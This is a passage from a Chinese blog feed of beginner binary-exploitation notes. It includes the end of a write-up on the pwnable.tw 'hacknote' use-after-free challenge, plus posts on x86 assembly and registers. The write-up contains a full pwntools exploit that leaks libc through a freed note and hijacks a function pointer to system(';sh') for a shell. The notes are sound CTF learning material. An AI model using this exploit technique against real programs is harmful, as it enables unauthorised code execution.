#### puts\n</code></pre>\n<p>​\t\t这是把堆当成栈来用了吗… 也不是, 这个不能用plt的puts来打印,因为没有栈传递参数,但它本身是有一个打印的函数的,正常情况下是打印存储的数据的,如下图,0x0804862b是打印函数,调用这个函数打印0x0804b018地址存储的数据,所以我们可以把这里改成puts的got表地址,就可以打印出来它的内容了</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-15-%E5%A0%86%E5%88%A9%E7%94%A8%E4%B9%8BUse-After-Free/image-20230416105824835.png\" alt=\"image-20230416105824835\"></p>\n<p>​\t\tputs_addr &#x3D; u32(io.recv(4)) 这样写还有问题</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">puts_addr = io.recv(<span class=\"number\">4</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;here:&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(puts_addr)</span><br></pre></td></tr></table></figure>\n<p>​\t\t调试一下就会发现有问题,打印的地方不对,在接收这个之前,其实还会接收到那一堆的提示信息,所以先把提示信息接收到,再接收地址即可</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Print(<span class=\"number\">0</span>)</span><br><span class=\"line\">io.recv()</span><br><span class=\"line\">puts_addr = u32(io.recv(<span class=\"number\">4</span>))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;here:&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(puts_addr))</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t</p>\n<p>后面再继续申请的话,编号是多少呢?</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">16</span>,<span class=\"string\">&quot;aaa&quot;</span>)</span><br><span class=\"line\">add(<span class=\"number\">16</span>,<span class=\"string\">&quot;bbb&quot;</span>)</span><br><span class=\"line\">delete(<span class=\"number\">0</span>)</span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\">add(<span class=\"number\">8</span>,p32(<span class=\"number\">0x804862B</span>) + p32(elf.got[<span class=\"string\">&quot;puts&quot;</span>])) <span class=\"comment\">//编号是多少???</span></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(arch=<span class=\"string\">&#x27;i386&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\">myelf = ELF(<span class=\"string\">&#x27;./hacknote&#x27;</span>)</span><br><span class=\"line\">mylibc = ELF(<span class=\"string\">&#x27;./libc_32.so.6&#x27;</span>)</span><br><span class=\"line\">io = remote(<span class=\"string\">&#x27;chall.pwnable.tw&#x27;</span>,<span class=\"number\">10102</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add_note</span>(<span class=\"params\">size,content</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;choice :&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;size :&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Content :&quot;</span>)</span><br><span class=\"line\">    io.sendline(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">del_note</span>(<span class=\"params\">index</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;choice :&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Index :&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">print_note</span>(<span class=\"params\">index</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;choice :&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;3&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Index :&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">add_note(<span class=\"number\">64</span>,<span class=\"string\">&quot;12&quot;</span>)</span><br><span class=\"line\">add_note(<span class=\"number\">32</span>,<span class=\"string\">&quot;12&quot;</span>)</span><br><span class=\"line\">del_note(<span class=\"number\">0</span>)</span><br><span class=\"line\">add_note(<span class=\"number\">64</span>,<span class=\"string\">&quot;45&quot;</span>)</span><br><span class=\"line\">print_note(<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">libc_addr = u32(io.recv(<span class=\"number\">8</span>)[<span class=\"number\">4</span>:<span class=\"number\">8</span>]) - <span class=\"number\">0x1b07b0</span></span><br><span class=\"line\">sys_addr = libc_addr + mylibc.symbols[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># add_note(8,&quot;12&quot;)</span></span><br><span class=\"line\"><span class=\"comment\"># add_note(8,&quot;34&quot;)</span></span><br><span class=\"line\"><span class=\"comment\"># del_note(3)</span></span><br><span class=\"line\"><span class=\"comment\"># del_note(4)</span></span><br><span class=\"line\">del_note(<span class=\"number\">0</span>)</span><br><span class=\"line\">del_note(<span class=\"number\">1</span>)</span><br><span class=\"line\">add_note(<span class=\"number\">8</span>,p32(sys_addr)+<span class=\"string\">&quot;;sh\\x00&quot;</span>)</span><br><span class=\"line\">print_note(<span class=\"number\">0</span>)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<p>libc_addr &#x3D; u32(io.recv(8)[4:8]) - 0x1b07b0<br>sys_addr &#x3D; libc_addr + libc.symbols[‘system’]</p>\n<p>首先,有随机化,这个随机化是什么? 所以必须每次要接收到地址才行,不能用之前的</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def <span class=\"title function_\">Print</span><span class=\"params\">(index)</span>:</span><br><span class=\"line\">    <span class=\"meta\">#io.sendlineafter(<span class=\"string\">&quot;choice&quot;</span>,<span class=\"string\">&quot;3&quot;</span>)</span></span><br><span class=\"line\">    <span class=\"meta\">#io.sendlineafter(<span class=\"string\">&quot;Index&quot;</span>,str(index))</span></span><br><span class=\"line\">    io.<span class=\"title function_\">recvuntil</span><span class=\"params\">(<span class=\"string\">&quot;choice :&quot;</span>)</span></span><br><span class=\"line\">    io.<span class=\"title function_\">sendline</span><span class=\"params\">(<span class=\"string\">&quot;3&quot;</span>)</span></span><br><span class=\"line\">    io.<span class=\"title function_\">recvuntil</span><span class=\"params\">(<span class=\"string\">&quot;Index :&quot;</span>)</span></span><br><span class=\"line\">    io.<span class=\"title function_\">sendline</span><span class=\"params\">(str(index))</span></span><br><span class=\"line\">这玩意有什么区别吗....</span><br><span class=\"line\">          io.<span class=\"title function_\">sendlineafter</span><span class=\"params\">(<span class=\"string\">&quot;choice :&quot;</span>,<span class=\"string\">&quot;3&quot;</span>)</span></span><br><span class=\"line\">    io.<span class=\"title function_\">sendlineafter</span><span class=\"params\">(<span class=\"string\">&quot;Index :&quot;</span>,str(index))</span></span><br><span class=\"line\">      改成这样也可以..........卧槽了.......尼玛范德萨发爱上,要骂人了</span><br><span class=\"line\">      </span><br><span class=\"line\">      </span><br><span class=\"line\">      </span><br><span class=\"line\"> [DEBUG] Received 0xc6 bytes:</span><br><span class=\"line\">    b&#x27;\\n&#x27;</span><br><span class=\"line\">    b&#x27;----------------------\\n&#x27;</span><br><span class=\"line\">    b&#x27;       HackNote       \\n&#x27;</span><br><span class=\"line\">    b&#x27;----------------------\\n&#x27;</span><br><span class=\"line\">    b&#x27; 1. Add note          \\n&#x27;</span><br><span class=\"line\">    b&#x27; 2. Delete note       \\n&#x27;</span><br><span class=\"line\">    b&#x27; 3. Print note        \\n&#x27;</span><br><span class=\"line\">    b&#x27; 4. Exit              \\n&#x27;</span><br><span class=\"line\">    b&#x27;----------------------\\n&#x27;</span><br><span class=\"line\">    b&#x27;Your choice :&#x27;</span><br><span class=\"line\">[DEBUG] Sent 0x2 bytes:</span><br><span class=\"line\">    b&#x27;3\\n&#x27;</span><br><span class=\"line\">[DEBUG] Received 0x7 bytes:</span><br><span class=\"line\">    b&#x27;Index :&#x27;</span><br><span class=\"line\">[DEBUG] Sent 0x2 bytes:</span><br><span class=\"line\">    b&#x27;2\\n&#x27;</span><br><span class=\"line\"><span class=\"title function_\">Traceback</span> <span class=\"params\">(most recent call last)</span>:</span><br><span class=\"line\">  File &quot;2.py&quot;, line 63, in &lt;module&gt;</span><br><span class=\"line\">    libc_addr = u32(io.recv(<span class=\"number\">8</span>)[<span class=\"number\">4</span>:<span class=\"number\">8</span>]) - <span class=\"number\">0x1b07b0</span></span><br><span class=\"line\">  File <span class=\"string\">&quot;/usr/local/lib/python3.6/dist-packages/pwnlib/context/__init__.py&quot;</span>, line <span class=\"number\">1597</span>, in setter</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"title function_\">function</span><span class=\"params\">(*a, **kw)</span></span><br><span class=\"line\">  File &quot;/usr/local/lib/python3.6/dist-packages/pwnlib/util/packing.py&quot;, line 353, in <span class=\"title function_\">routine</span></span><br><span class=\"line\">    <span class=\"params\">(<span class=\"string\">&quot;big&quot;</span>,    False)</span>:  bu&#125;[endian, <span class=\"type\">signed</span>]<span class=\"params\">(number, <span class=\"number\">3</span>)</span></span><br><span class=\"line\">  File &quot;/usr/local/lib/python3.6/dist-packages/pwnlib/util/packing.py&quot;, line 320, in routine</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"title function_\">struct_op</span><span class=\"params\">(data)</span>[0]</span><br><span class=\"line\"><span class=\"keyword\">struct</span>.error: unpack requires a buffer of 4 bytes</span><br><span class=\"line\">[*] Closed connection to chall.pwnable.tw port 10102</span><br></pre></td></tr></table></figure>\n\n<p>我知道了………..如果不在这之后发..收到的就是后面的那个东西了…….</p>\n<p>choice : 会收到 空格和:作为recv的值……</p>\n<h3 id=\"调试\"><a href=\"#调试\" class=\"headerlink\" title=\"调试\"></a>调试</h3><p>wiki里有调试,可以学一下</p>\n<h3 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h3><p>​\t\t如何进行调试源代码? 指定源代码一行一行走?</p>\n<p>​\t\tgdb调试的时候r了,ctrl+c了,怎么继续执行    好像没太有办法,可以下断点!也挺好用的</p>\n<p>​\t\t为什么释放的chunk是0x18 也就是24呢,不是16吗 和对其有关? </p>\n<p>​\t\t怎么在gdb里面发送 p32 p64这种数据呢?  可以用eb命令等 直接修改内存就可以了</p>\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-16-%E6%B1%87%E7%BC%96%E5%8F%8D%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-16-%E6%B1%87%E7%BC%96%E5%8F%8D%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/",
            "title": "pwn入门-16-汇编反汇编基础",
            "date_published": "2023-03-03T13:54:42.000Z",
            "content_html": "<h1 id=\"常用汇编指令\"><a href=\"#常用汇编指令\" class=\"headerlink\" title=\"常用汇编指令\"></a>常用汇编指令</h1><p>lea 加载有效地址</p>\n<p>​\tlea   eax, [ebx+8]  将ebx+8存储的内存<font color=\"red\">地址</font> +8 传给eax</p>\n<p>​\tmov eax, [ebx+8]  将ebx+8内存地址指向的<font color=\"red\">数据</font> 传给eax</p>\n<p>cmp</p>\n<h2 id=\"算数运算\"><a href=\"#算数运算\" class=\"headerlink\" title=\"算数运算\"></a>算数运算</h2><p>sub 减</p>\n<p>add 加</p>\n<p>inc +1</p>\n<p>dec -1</p>\n<p>mul 乘</p>\n<p>div 除</p>\n<h2 id=\"条件指令及跳转指令\"><a href=\"#条件指令及跳转指令\" class=\"headerlink\" title=\"条件指令及跳转指令\"></a>条件指令及跳转指令</h2><p><a href=\"https://blog.csdn.net/counsellor/article/details/81005101\">https://blog.csdn.net/counsellor/article/details/81005101</a></p>\n<p>jmp  无条件跳转                                      p74-76</p>\n<p>这几个都是根据标志位跳转</p>\n<p>jz 如果ZF标志位置位则跳转  等于</p>\n<p>jnz 如果ZF标志位被清除则跳转 不等于</p>\n<p>je 等于跳转</p>\n<p>jg 有符号大于则跳转</p>\n<p>test eax,eax 检测目标值是否为0 ,即两个操作数按位与运算,为0的话设置标志位ZF为1,否则为0(不修改使用的操作数)</p>\n<p>cmp eax,ebx 如果两个参数相等,ZF标志位置位</p>\n<p>一般在cmp指令后用je，test指令后用jz</p>\n<h2 id=\"函数使用的\"><a href=\"#函数使用的\" class=\"headerlink\" title=\"函数使用的\"></a>函数使用的</h2><p>call</p>\n<p>leave</p>\n<p>enter</p>\n<p>ret</p>\n<p><a href=\"https://www.codenong.com/10483544/\">https://www.codenong.com/10483544/</a></p>\n<h2 id=\"全局变量与局部变量\"><a href=\"#全局变量与局部变量\" class=\"headerlink\" title=\"全局变量与局部变量\"></a>全局变量与局部变量</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> i = <span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> j =<span class=\"number\">2</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;this is:%d %d\\n&quot;</span>,i,j);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-16-%E6%B1%87%E7%BC%96%E5%8F%8D%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/image-20230303215108473.png\" alt=\"image-20230303215108473\"></p>\n<p>全局变量i通过内存地址引用,局部变量通过栈地址引用</p>\n<h1 id=\"算数运算-1\"><a href=\"#算数运算-1\" class=\"headerlink\" title=\"算数运算\"></a>算数运算</h1><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> i = <span class=\"number\">10</span>;</span><br><span class=\"line\">  <span class=\"type\">int</span> j=<span class=\"number\">2</span>;</span><br><span class=\"line\">  <span class=\"type\">int</span> k;</span><br><span class=\"line\">  i = i +<span class=\"number\">2</span>;</span><br><span class=\"line\">  k = i/j;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;this is:%d %d %d\\n&quot;</span>,i,j,k);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:000000000000064A                 push    rbp</span><br><span class=\"line\">.text:000000000000064B                 mov     rbp, rsp</span><br><span class=\"line\">.text:000000000000064E                 sub     rsp, 10h</span><br><span class=\"line\">.text:0000000000000652                 mov     [rbp+var_C], 0Ah          ; int i =10</span><br><span class=\"line\">.text:0000000000000659                 mov     [rbp+var_8], 2\t\t\t\t\t\t;int j=2;</span><br><span class=\"line\">.text:0000000000000660                 add     [rbp+var_C], 2\t\t\t\t\t\t; i = i +2;</span><br><span class=\"line\">.text:0000000000000664                 mov     eax, [rbp+var_C]         ; 把i放到eax中当作被除数</span><br><span class=\"line\">.text:0000000000000667                 cdq</span><br><span class=\"line\">.text:0000000000000668                 idiv    [rbp+var_8]              ;j是除数</span><br><span class=\"line\">.text:000000000000066B                 mov     [rbp+var_4], eax         ;结果放到k中</span><br><span class=\"line\">.text:000000000000066E                 mov     ecx, [rbp+var_4]\t\t;k</span><br><span class=\"line\">.text:0000000000000671                 mov     edx, [rbp+var_8]\t\t;j</span><br><span class=\"line\">.text:0000000000000674                 mov     eax, [rbp+var_C]\t\t;i</span><br><span class=\"line\">.text:0000000000000677                 mov     esi, eax\t\t\t\t\t;i</span><br><span class=\"line\">.text:0000000000000679                 lea     rdi, format     ; &quot;this is:%d %d %d\\n&quot;</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"识别if语句\"><a href=\"#识别if语句\" class=\"headerlink\" title=\"识别if语句\"></a>识别if语句</h1><p>• if语句的结构 </p>\n<p>​\t– if语句主要由判断语句和跳转语句构成 </p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> i = <span class=\"number\">3</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span>(i == <span class=\"number\">3</span>)</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    \t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot; this is 3&quot;</span>);</span><br><span class=\"line\">  &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    \t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot; this is not 3&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-16-%E6%B1%87%E7%BC%96%E5%8F%8D%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/image-20230306155253463.png\" alt=\"image-20230306155253463\"></p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-16-%E6%B1%87%E7%BC%96%E5%8F%8D%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/image-20230306155311814.png\" alt=\"image-20230306155311814\"></p>\n<h1 id=\"识别循环\"><a href=\"#识别循环\" class=\"headerlink\" title=\"识别循环\"></a>识别循环</h1><p>for和while循环差距不大</p>\n<p>for循环的4个组件 </p>\n<p>​\t– 初始化、比较、执行指令、递增或递减</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> n = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i=<span class=\"number\">1</span>;i&lt;<span class=\"number\">101</span>;i++)</span><br><span class=\"line\">    n += i;</span><br><span class=\"line\">  </span><br><span class=\"line\">   <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;the sum is: %d\\n&quot;</span>,n);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-16-%E6%B1%87%E7%BC%96%E5%8F%8D%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/image-20230306160758436.png\" alt=\"image-20230306160758436\"></p>\n<h1 id=\"识别结构体\"><a href=\"#识别结构体\" class=\"headerlink\" title=\"识别结构体\"></a>识别结构体</h1><h1 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h1><p>一开始执行的是什么玩意??</p>\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-14-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E6%9F%A5%E7%BC%BA%E8%A1%A5%E6%BC%8F1/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-14-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E6%9F%A5%E7%BC%BA%E8%A1%A5%E6%BC%8F1/",
            "title": "pwn入门-14-基础知识查缺补漏1",
            "date_published": "2023-03-03T11:17:35.000Z",
            "content_html": "<h1 id=\"寄存器\"><a href=\"#寄存器\" class=\"headerlink\" title=\"寄存器\"></a>寄存器</h1><p><img src=\"/pwn%E5%85%A5%E9%97%A8-14-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E6%9F%A5%E7%BC%BA%E8%A1%A5%E6%BC%8F1/image-20230308133539208.png\" alt=\"image-20230308133539208\"></p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-14-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E6%9F%A5%E7%BC%BA%E8%A1%A5%E6%BC%8F1/image-20230308133315474.png\" alt=\"image-20230308133315474\"></p>\n<h2 id=\"EFLAGS-状态寄存器-32位\"><a href=\"#EFLAGS-状态寄存器-32位\" class=\"headerlink\" title=\"EFLAGS 状态寄存器 32位\"></a>EFLAGS 状态寄存器 32位</h2><p><a href=\"https://article.itxueyuan.com/1DeLA0\">https://article.itxueyuan.com/1DeLA0</a></p>\n<p>​\t\t每一位都是一个标识,置位为1或清除为0</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-14-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E6%9F%A5%E7%BC%BA%E8%A1%A5%E6%BC%8F1/image-20230308133455659.png\" alt=\"image-20230308133455659\"></p>\n<h3 id=\"几个重要的标志位\"><a href=\"#几个重要的标志位\" class=\"headerlink\" title=\"几个重要的标志位\"></a>几个重要的标志位</h3><p>​\t\t• ZF – 运算结果为0，ZF被置位，否则被清除 </p>\n<p>​\t\t• CF – 结果相对于目标操作数太大或者太小时CF被置位，否则被清除 </p>\n<p>​\t\t• SF – 运算结果为负，或者运算结果最高位为1时，SF被 置位 </p>\n<p>​\t\t• TF – 用于调试，当它被置位时，x86处理器每次只执行一条指令</p>\n<h1 id=\"调用约定\"><a href=\"#调用约定\" class=\"headerlink\" title=\"调用约定\"></a>调用约定</h1><p><img src=\"/pwn%E5%85%A5%E9%97%A8-14-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E6%9F%A5%E7%BC%BA%E8%A1%A5%E6%BC%8F1/image-20230303213215000.png\" alt=\"image-20230303213215000\"></p>\n<p><a href=\"https://www.codenong.com/10483544/\">https://www.codenong.com/10483544/</a></p>\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-13-%E5%A0%86%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-13-%E5%A0%86%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80/",
            "title": "pwn入门-13-堆入门基础",
            "date_published": "2023-02-28T10:35:20.000Z",
